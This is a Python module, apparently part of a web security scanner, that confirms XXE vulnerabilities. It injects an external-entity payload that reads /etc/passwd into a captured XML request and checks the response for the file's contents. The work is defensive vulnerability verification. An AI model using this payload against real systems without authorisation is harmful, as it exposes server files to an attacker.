from backend.services.verification_engine import (
    VerificationStatus,
    VerificationReasonCode,
    VerificationConclusion,
    BaseVerificationStrategy,
    VerificationContext,
    VerificationContract,
)
from backend.services.verification_strategies.request_builder import build_injected_request
import re

class XxeVerificationStrategy(BaseVerificationStrategy):
    """
    Verifies XXE by injecting an XML external entity payload and checking
    for file disclosure indicators in the response.
    """
    
    contract = VerificationContract(
        check_id="C033_XXE_Indicators",
        name="XXE Verification",
        security_property="Server must disable external entity resolution in XML parsers.",
        required_evidence_fields=["proof_request"],
        destructive=False,
    )

    async def verify(self, context: VerificationContext) -> VerificationConclusion:
        candidate = context.candidate_evidence
        if context.budget.max_requests <= 0:
            return VerificationConclusion(
                status=VerificationStatus.INCONCLUSIVE,
                reason_code=VerificationReasonCode.BUDGET_EXHAUSTED,
                reason_description="Verification budget exhausted.",
            )

        injected_req = build_injected_request(candidate, "")
        if not injected_req:
            return VerificationConclusion(
                status=VerificationStatus.INCONCLUSIVE,
                reason_code=VerificationReasonCode.MISSING_EVIDENCE,
                reason_description="Could not reconstruct proof request.",
            )

        if not injected_req.body or not isinstance(injected_req.body, str) or "<" not in injected_req.body:
            return VerificationConclusion(
                status=VerificationStatus.INCONCLUSIVE,
                reason_code=VerificationReasonCode.MISSING_EVIDENCE,
                reason_description="Proof request does not contain an XML body.",
            )

        # Inject XXE payload
        xxe_payload = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        
        # We need to insert the entity reference inside one of the XML tags
        # Find the first element with content and replace it
        new_data = re.sub(
            r'(<[a-zA-Z0-9_:-]+>)[^<]+(</[a-zA-Z0-9_:-]+>)',
            r'\1&xxe;\2',
            injected_req.body,
            count=1
        )
        
        # Replace or prepend the doctype
        if "<?xml" in new_data:
            new_data = re.sub(r'<\?xml[^>]+\?>', xxe_payload, new_data, count=1)
        else:
            new_data = xxe_payload + new_data
            
        injected_req.body = new_data
        
        context.budget.max_requests -= 1
        response = await context.request_engine.execute(injected_req)
        
        ev_id = context.record_evidence(
            evidence_type="xxe_replay_attempt",
            data={"status": response.status_code, "body": response.response_body},
            request_id=response.request_id,
        )

        if response.response_body and "root:x:0:0" in response.response_body:
            return VerificationConclusion(
                status=VerificationStatus.VERIFIED,
                reason_code=VerificationReasonCode.REPRODUCED_SUCCESSFULLY,
                reason_description="XXE payload successfully disclosed /etc/passwd contents.",
                evidence_ids=[ev_id],
                request_ids=[response.request_id],
                confidence=100,
            )

        return VerificationConclusion(
            status=VerificationStatus.FALSE_POSITIVE,
            reason_code=VerificationReasonCode.CONTRADICTORY_EVIDENCE,
            reason_description="XXE payload was rejected or did not disclose file contents.",
            evidence_ids=[ev_id],
            request_ids=[response.request_id],
            confidence=100,
        )
